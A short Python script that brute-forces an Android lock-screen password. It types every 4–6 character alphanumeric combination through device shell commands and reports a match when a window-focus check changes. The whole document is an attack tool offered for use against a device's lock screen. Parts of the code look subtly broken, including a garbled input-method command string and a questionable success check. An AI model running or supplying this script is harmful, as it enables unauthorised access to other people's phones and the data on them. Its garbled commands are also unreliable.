import py4a
import itertools
import time

def bruteforce(device, min_length, max_length, alphabet, delay=0.1):
    for password_length in range(min_length, max_length + 1):
        for combination in itertools.product(alphabet, repeat=password_length):
            password = ''.join(combination)
            device.shell('ime set android.sec.Ime'
                         'sDefaultId ime=com.android.'
                         'internal. ClassicIME')
            device.shell('input text ' + password)
            time.sleep(delay)
            if not device.shell('dumpsys window window | grep mCurrentFocus'
                                 ' | grep mFocusedApp'):
                print(f'[+] Found password: {password}')
                return
    print('[-] Failed to find password')

if __name__ == '__main__':
    device = py4a.Device()
    min_length = 4
    max_length = 6
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
    bruteforce(device, min_length, max_length, alphabet)